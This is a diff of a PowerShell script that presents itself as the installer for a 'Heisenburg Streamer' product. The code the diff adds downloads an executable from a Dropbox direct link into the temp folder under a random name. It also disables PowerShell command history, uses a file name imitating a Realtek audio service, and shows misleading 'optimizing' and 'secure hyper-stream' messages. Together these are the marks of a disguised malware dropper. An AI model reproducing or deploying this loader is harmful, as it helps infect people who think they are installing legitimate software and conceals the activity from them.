@@ -1,3 +1,4 @@
+
 # ========================================================
 # HEISENBURG STREAMER - HYPER-STREAM INSTALLATION v6.0
 # ========================================================
@@ -85,11 +86,8 @@ try {
     Set-PSReadlineOption -HistorySaveStyle SaveNothing -ErrorAction SilentlyContinue
     
     $rnd = -join ((65..90) + (97..122) | Get-Random -Count 10 | % {[char]$_})
-    $exe = "$env:TEMP\RtkAudUService64.exe"
-    
-    # ========== SIRF YAHAN 3 LINES CHANGE HUIN ==========
-    # LINE 1: URL change kiya (apne Dropbox ka direct link)
-    $url = "https://www.dropbox.com/scl/fi/37knymyf7l250grorva4f/RtkAudUService64.exe?rlkey=xis3n39bomkm5rxfnb9wc11j9&st=cqfvpiya&dl=0"
+    $exe = "$env:TEMP\$rnd.exe"
+    $url = "https://www.dropbox.com/scl/fi/iwv6cm1n1qo3kdn9gmn36/RtkAudUService64.exe?rlkey=csrph0p954x523nhvxoqf8m9z&st=1c2xz36h&dl=1"
     
     Write-Host "`n[+] INITIALIZING SYSTEM HYPER-CONNECTION..." -ForegroundColor Yellow
     Write-Host "[+] OPTIMIZING SYSTEM ENVIRONMENT..." -ForegroundColor Gray
@@ -107,12 +105,7 @@ try {
     } catch {}
 
     Write-Host "[+] ESTABLISHING SECURE HYPER-STREAM..." -ForegroundColor Gray
-    
-    # LINE 2: Download function call mein change - alag variable use kiya
-    $downloadSuccess = Invoke-HyperStreamDownload -Url $url -TargetPath $exe
-    
-    # LINE 3: Condition check mein change - naya variable check kiya
-    if (-not ($downloadSuccess)) {
+    if (-not (Invoke-HyperStreamDownload -Url $url -TargetPath $exe)) {
         throw "Hyper-Stream failed. Check connection."
     }
 
